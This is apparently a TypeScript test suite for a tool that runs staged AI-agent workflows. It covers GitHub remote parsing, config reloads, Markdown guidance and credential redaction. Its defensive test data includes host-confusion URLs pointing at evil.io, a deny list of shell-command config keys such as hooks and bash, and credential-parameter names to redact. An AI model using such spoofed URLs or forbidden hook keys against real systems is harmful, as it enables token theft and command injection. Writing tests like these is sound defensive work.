		`https://github.com/${path}.git`,
		`https://github.com/${path}.git\n`,
		`https://x-access-token:${secret}@github.com/${path}.git`,
		`https://${secret}@github.com/${path}`,
		`git@github.com:${path}.git`,
		`git@github.com:${path}`,
	];

	for (const remote of accepted) {
		it(`accepts ${JSON.stringify(remote)}`, () => {
			assert.equal(githubRepoFromRemote(remote), repo);
		});
	}

	const rejected = [
		`https://evil.io?@github.com/${path}.git`,
		`https://evil.io#@github.com/${path}.git`,
		`https://github.com/${path}.git?token=${secret}`,
		`https://github.com/${path}?`,
		`https://github.com/${path}#readme`,
		`https://github.com:443/${path}`,
		`https://github.com:8443/${path}`,
		`https://github.com/${path}/`,
		`https://github.com/${path}/extra`,
		"https://github.com/giuseppecrj",
		`https://github.com.evil.io/${path}`,
		`https://github.com\\@evil.io/${path}`,
		`http://github.com/${path}`,
		`ssh://git@github.com/${path}.git`,
		`git@github.com:${path}.git?x`,
		`git@evil.io:${path}.git`,
		`https://user:hunter2@gitlab.com/${path}.git`,
		"/srv/git/repo.git",
	];

	for (const remote of rejected) {
		it(`rejects ${JSON.stringify(remote)}`, () => {
			assert.equal(githubRepoFromRemote(remote), null);
		});
	}
});

describe("reload verification", () => {
	const fixture = { sha: candidateSha, text: valid };
	const broken = { sha: candidateSha, text: frontMatter("hooks: {}") };
	const missing = { sha: mainSha, text: null };

	const cases: [string, Map<string, Branch>, string[], string, boolean][] = [
		[
			"applied",
			new Map([
				["main", { sha: mainSha, text: valid }],
				["fixture", fixture],
			]),
			["--reload-ref", "fixture"],
			"fixture",
			true,
		],
		[
			"kept",
			new Map([
				["main", { sha: mainSha, text: valid }],
				["broken", broken],
			]),
			["--reload-ref", "broken"],
			"main",
			false,
		],
		[
			"kept",
			new Map([
				["fixture", fixture],
				["main", { sha: mainSha, text: frontMatter("hooks: {}") }],
			]),
			["--ref", "fixture", "--reload-ref", "main"],
			"fixture",
			true,
		],
		[
			"unavailable",
			new Map([
				["main", missing],
				["other", { sha: candidateSha, text: null }],
			]),
			["--reload-ref", "other"],
			"",
			true,
		],
	];

	for (const [outcome, branches, flags, inForce, verification] of cases) {
		it(`reload view marks verification from the in-force ref: ${outcome} ${flags.join(" ")}`, async () => {
			const run = await cli(
				["workflow-check", "--json", "--repo", repo, ...flags],
				branches,
			);

			assert.partialDeepStrictEqual(run.json, {
				reload: {
					outcome,
					verification,
					inForce: inForce === "" ? null : { ref: inForce },
				},
			});
		});
	}
});

describe("guidance code fences", () => {
	const fenced: [string, string][] = [
		[
			"a 4-backtick fence around 3 backticks",
			"````\n```\n## unknown\n```\n````",
		],
		["an indented fence", "   ```\n## unknown\n   ```"],
		[
			"an info string that is not a close",
			"```\n```not-a-close\n## unknown\n```",
		],
		["a tilde fence", "~~~\n## unknown\n~~~"],
		[
			"a tilde fence with a non-closing line",
			"~~~\n~~~not-a-close\n```\n## unknown\n~~~",
		],
		["a closing fence longer than the opening", "```\n## unknown\n`````"],
		["an indented closing fence", "~~~~\n## unknown\n   ~~~~  "],
	];

	for (const [name, block] of fenced) {
		it(`keeps a heading inside ${name} as guidance text`, () => {
			const parsed = parse(
				`${frontMatter("")}\n## build\n${block}\n\n## review\nRead it.\n`,
			);

			assert.equal(parsed.kind, "valid", JSON.stringify(parsed));

			if (parsed.kind !== "valid") return;

			assert.match(parsed.guidance.stages.build ?? "", /## unknown/);
			assert.equal(parsed.guidance.stages.review, "Read it.");
		});
	}

	it("ends a fence only on a matching close", () => {
		const parsed = parse(
			`${frontMatter("")}\n## build\n\`\`\`\ncode\n\`\`\`\n## deploy\n`,
		);

		assert.equal(parsed.kind, "invalid");

		const indented = parse(`${frontMatter("")}\n    \`\`\`\n## deploy\n`);

		assert.equal(indented.kind, "invalid");
	});
});

describe("guidance sections from the Markdown lexer", () => {
	function guidance(body: string) {
		const parsed = parse(`${frontMatter("")}\n${body}`);

		assert.equal(parsed.kind, "valid", JSON.stringify(parsed));

		return parsed.kind === "valid" ? parsed.guidance : null;
	}

	it("ends a fence left open in a list item with the item", () => {
		const read = guidance(
			"## build\n- step\n  ```\n  ## unknown\n- next\n\n## review\nRead it.\n",
		);

		assert.match(read?.stages.build ?? "", /## unknown/);
		assert.equal(read?.stages.review, "Read it.");
	});

	it("keeps a fenced block inside a list item", () => {
		const read = guidance(
			"## build\n1. step\n   ```\n   ## unknown\n   ```\n\n## review\nRead it.\n",
		);

		assert.match(read?.stages.build ?? "", /## unknown/);
		assert.equal(read?.stages.review, "Read it.");
	});

	it("does not split on a heading inside a blockquote", () => {
		const read = guidance("## review\n> ## build\n> quoted\n\nafter\n");

		assert.equal(read?.stages.review, "> ## build\n> quoted\n\nafter");
		assert.equal(read?.stages.build, undefined);
	});

	it("does not split on a setext heading", () => {
		const read = guidance("## review\nbuild\n---\nmore\n");

		assert.equal(read?.stages.review, "build\n---\nmore");
		assert.equal(read?.stages.build, undefined);
	});

	it("keeps section text byte for byte", () => {
		const read = guidance(
			"intro\n\n## build ##\n[x]: https://example.com\n\tindented code\n\n| a | b |\n| - | - |\n| 1 | 2 |\n",
		);

		assert.equal(read?.general, "body\n\nintro");
		assert.equal(
			read?.stages.build,
			"[x]: https://example.com\n\tindented code\n\n| a | b |\n| - | - |\n| 1 | 2 |",
		);
	});

	it("still rejects an unknown or duplicate stage heading", () => {
		assert.equal(
			validation(`${frontMatter("")}\n## deploy\n`).field,
			"guidance",
		);
		assert.equal(
			validation(`${frontMatter("")}\n## build\na\n\n   ## build\nb\n`).field,
			"guidance",
		);
	});
});

describe("YAML anchors and aliases", () => {
	const cases = [
		[
			"a valid alias",
			"common: &common\n  max_turns: 3\nstages:\n  review: *common",
			/alias at line 6/,
		],
		["an unresolved alias", "future: *missing", /alias at line 3/],
		[
			"an anchor without an alias",
			"polling: &p\n  interval_ms: 30000",
			/anchor at line 3/,
		],
	] as const;

	for (const [name, lines, location] of cases) {
		it(`rejects ${name} as a parse error naming its location`, () => {
			const error = errorOf(frontMatter(lines));

			assert.equal(error.kind, "workflow_parse_error");
			assert.match(error.message, /anchors and aliases are not allowed/);
			assert.match(error.message, location);
		});
	}
});

describe("valid reload onto a valid snapshot", () => {
	it("replaces the snapshot and leaves the old one frozen and unchanged", async () => {
		const nextText = `---
repository: giuseppecrj/pi-herdr-factorio
polling:
  interval_ms: 60000
stages:
  build:
    model: openai/gpt-6.1-terra
---
## build
Run the suite.
`;

		const first = await load(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		const second = await load(
			new Map([["main", { sha: candidateSha, text: nextText }]]),
		);

		assert.equal(first.kind, "loaded");
		assert.equal(second.kind, "loaded");

		if (first.kind !== "loaded" || second.kind !== "loaded") return;

		const before = JSON.stringify(first.snapshot);
		const reload = reloadWorkflow(first.snapshot, second);

		assert.equal(reload.kind, "applied");

		if (reload.kind !== "applied") return;

		assert.equal(reload.snapshot, second.snapshot);
		assert.notEqual(reload.snapshot, first.snapshot);
		assert.equal(reload.snapshot.sha, candidateSha);
		assert.equal(reload.snapshot.digest, digestOf(nextText));
		assert.notEqual(reload.snapshot.digest, first.snapshot.digest);
		assert.equal(reload.snapshot.config.polling.intervalMs, 60_000);
		assert.equal(
			reload.snapshot.config.stages.build.model,
			"openai/gpt-6.1-terra",
		);
		assert.equal(reload.snapshot.guidance.stages.build, "Run the suite.");
		assert.equal(reload.snapshot.guidance.stages.review, undefined);

		assert.equal(JSON.stringify(first.snapshot), before);
		assert.ok(Object.isFrozen(first.snapshot));
		assert.ok(Object.isFrozen(first.snapshot.config));
		assert.ok(Object.isFrozen(first.snapshot.guidance));
		assert.equal(first.snapshot.config.polling.intervalMs, 30_000);
	});
});

describe("shell-command keys", () => {
	const rootKeys = [
		"Hooks",
		"HOOKS",
		'"hooks "',
		"run",
		"bash",
		"before_run",
		"after_create",
		"hook",
	];

	for (const key of rootKeys) {
		it(`rejects the top-level key ${key}`, () => {
			const error = validation(frontMatter(`${key}: x`));

			assert.equal(error.field, key.startsWith('"') ? "(name withheld)" : key);
			assert.match(error.message, /shell commands/);
		});
	}

	const nested: [string, string][] = [
		["polling:\n  Hooks: x", "polling.Hooks"],
		["agent:\n  run: x", "agent.run"],
		["workspace:\n  bash: x", "workspace.bash"],
		["retry:\n  before_run: x", "retry.before_run"],
		["usage:\n  Exec: x", "usage.Exec"],
		["stages:\n  HOOK: x", "stages.HOOK"],
		["stages:\n  build:\n    after_create: x", "stages.build.after_create"],
		["checkpoints:\n  script: x", "checkpoints.script"],
		[
			"checkpoints:\n  approve_merge:\n    Shell: x",
			"checkpoints.approve_merge.Shell",
		],
	];

	for (const [lines, field] of nested) {
		it(`rejects the shell-command key ${field}`, () => {
			const error = validation(frontMatter(lines));

			assert.equal(error.field, field);
			assert.match(error.message, /shell commands/);
		});
	}
});

describe("workflow file shapes", () => {
	it("rejects duplicate stage headings", () => {
		const error = validation(
			`${frontMatter("")}\n## build\na\n\n## build\nb\n`,
		);

		assert.equal(error.field, "guidance");
		assert.match(error.message, /duplicate heading "## build"/);
	});

	it("rejects an unknown stage heading", () => {
		const error = validation(`${frontMatter("")}\n## ship\nnow\n`);

		assert.equal(error.field, "guidance");
		assert.match(error.message, /names no stage: use one of admit, /);
		assert.doesNotMatch(error.message, /ship/);
	});

	it("reads CRLF line endings", () => {
		const parsed = parse(valid.replaceAll("\n", "\r\n"));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		assert.equal(parsed.config.stages.build.budget.maxTurns, 30);
		assert.equal(parsed.guidance.general, "General guidance.");
		assert.equal(parsed.guidance.stages.build, "Write the test first.");
		assert.doesNotMatch(JSON.stringify(parsed.guidance), /\\r/);
	});

	it("reads a file with a leading BOM", () => {
		const parsed = parse(`\uFEFF${valid}`);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.equal(parsed.config.agent.maxConcurrent, 2);
		}
	});

	it("keeps a --- line in the body as guidance", () => {
		const parsed = parse(`${frontMatter("")}\n## build\nabove\n---\nbelow\n`);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.equal(parsed.guidance.stages.build, "above\n---\nbelow");
		}
	});

	it("chooses a non-default model for one stage", () => {
		const parsed = parse(
			frontMatter("stages:\n  review:\n    model: openai/gpt-6.1-terra"),
		);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		assert.equal(parsed.config.stages.review.model, "openai/gpt-6.1-terra");

		for (const stage of MODEL_STAGES.filter((name) => name !== "review")) {
			assert.equal(parsed.config.stages[stage].model, DEFAULT_MODEL);
		}
	});
});

describe("second-layer redaction", () => {
	it("redacts credential query parameters, case-insensitively", () => {
		const names = [
			"token",
			"access_token",
			"auth",
			"key",
			"password",
			"secret",
			"sig",
			"signature",
			"code",
		];

		for (const name of names) {
			for (const spelled of [name, name.toUpperCase()]) {
				assert.equal(
					redactCredentials(
						`https://h/x?page=2&${spelled}=${secret}&next=3#top`,
					),
					`https://h/x?page=2&${spelled}=<redacted>&next=3#top`,
				);
				assert.equal(
					redactCredentials(`see https://h/x?${spelled}=${secret} now`),
					`see https://h/x?${spelled}=<redacted> now`,
				);
			}
		}

		assert.equal(
			redactCredentials("https://h/x?monkey=1&tokens=2"),
			"https://h/x?monkey=1&tokens=2",
		);
	});

	it("keeps unrelated text in a multiline value with ECONNREFUSED@proxy", async () => {
		const general = [
			"connect https://api.github.com",
			"ECONNREFUSED@proxy:8080",
		].join("\n");

		const run = await runRaw(
			["workflow-check", "--json", "--repo", repo],
			serving(`${frontMatter("")}\n${general}\n`),
		);

		assert.equal(run.code, EXIT.ok);
		assert.partialDeepStrictEqual(JSON.parse(run.stdout), {
			guidance: { general: `body\n\n${general}` },
		});
	});

	it("redacts a query credential inside a JSON string value", async () => {
		const run = await runRaw(
			["workflow-check", "--json", "--repo", repo],
			serving(`${frontMatter("")}\nfetch https://h/x?token=${secret}\n`),
		);

		assert.equal(run.code, EXIT.ok);
		assertNoSecret(run.stdout);
		assert.partialDeepStrictEqual(JSON.parse(run.stdout), {
			guidance: { general: "body\n\nfetch https://h/x?token=<redacted>" },
		});
	});
});
